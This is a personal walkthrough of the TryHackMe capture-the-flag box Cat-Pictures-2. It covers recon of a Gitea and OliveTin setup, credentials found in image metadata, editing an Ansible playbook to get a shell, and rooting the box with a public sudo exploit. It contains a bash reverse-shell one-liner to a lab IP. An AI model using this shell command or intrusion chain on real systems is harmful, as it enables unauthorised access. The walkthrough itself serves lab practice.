# Cat-Pictures-2 Helped-Through


Name: Cat-Pictures-2
Date:  13/07/2023
Difficulty:  Easy
Goals:  
- Warm up
- Git pwn tooling, tooled up
Learnt:
Beyond Root:
- Update H4ddix B4dger for an hour
- Ansible for Vulnerable Machines outlined in [[Absolute-Helped-Through]] and [[Response-Helped-Through]]


![](f5054e97620f168c7b5088c85ab1d6e4.jpg)

- [[Cat-Pictures-2-Notes.md]]
- [[Cat-Pictures-2-CMD-by-CMDs.md]]

Due to time and the amount of it either this will get swept under into the pile and I am trying to not start new boxes and to cut it off at the pass and finish with [Alh4zr3d](https://www.twitch.tv/videos/1869386033) while I build my Windows VM for [[Absolute-Helped-Through]] and [[Response-Helped-Through]]

## Recon

The time to live(ttl) indicates its OS. It is a decrementation from each hop back to original ping sender. Linux is < 64, Windows is < 128.
![ping](TryHackMe/Markdown/Cat-Pictures-2/Screenshots/ping.png)

Robots.txt
```
Disallow: /data/
Disallow: /dist/
Disallow: /docs/
Disallow: /php/
Disallow: /plugins/
Disallow: /src/
Disallow: /uploads/
```

Gitea is running on 3000
```
|     Set-Cookie: i_like_gitea=e9214322330dc1c9; Path=/; HttpOnly; SameSite=Lax
|     Set-Cookie: _csrf=ZEVmBSA53-Qcd_iTesJat_fu4p06MTY4ODIzMjE0NjY0NTE5MTM3OQ; Path=/; Expires=Sun, 02 Jul 2023 17:22:26 GMT; HttpOnly; SameSite=Lax
|     Set-Cookie: macaron_flash=; Path=/; Max-Age=0; HttpOnly; SameSite=Lax
```

git pwning tools
git log HEAD root and lychee usage
https://github.com/electerious/Lychee.git
1337 Olive Tin Version: 2022-10-19 - https://docs.olivetin.app/
8080 SimpleHTTP/0.6 Python/3.6.9

Once again data in the pictures...
![](exifisgood.png)

Credentials and references to ansible
![1080](ctfy.png)

Gitea is self-hosted git service
![](gitearoot.png)

A like hocky 
![](giteasignin.png)

The first flag is in this repository
![](flag1.png)

No low hanging fruit
![](nocredreuse.png)

[Olive Tin](https://www.olivetin.app/) to run shell commands

```
bash -i >& /dev/tcp/10.11.3.193/6969 0>&1
```

It is running this playbook
```yaml
---
- name: Test 
  hosts: all                                  # Define all the hosts
  remote_user: bismuth                                  
  # Defining the Ansible task
  tasks:             
    - name: get the username running the deploy
      become: false
      command: whoami
      register: username_on_the_host
      changed_when: false

    - debug: var=username_on_the_host

    - name: Test
      shell: echo hi
```

Editting the playbook
![](6969.png)

To get a shell, I then copied the id_rsa and got a ssh shell 
![](shellonbox.png)

Tried Polkit because I never use it and Al talks about Kernel exploits, but it failed. Al uses [CtpGibbon SAMEdit](https://github.com/CptGibbon/CVE-2021-3156) to root the box. All the other written write ups exploit the vulnerable version of sudo. So I am glad I used this to start off the day.

![](cptgibbonsamedit.png)

## Beyond Root

[Git Dumper](https://github.com/arthaud/git-dumper) - requires pip, but dumped some stuff
![](dumpedsomestuff.png)

[Trufflehog](https://github.com/trufflesecurity/trufflehog) can check organisation, github, s3 buckets, etc although it was not very useful in this scenario.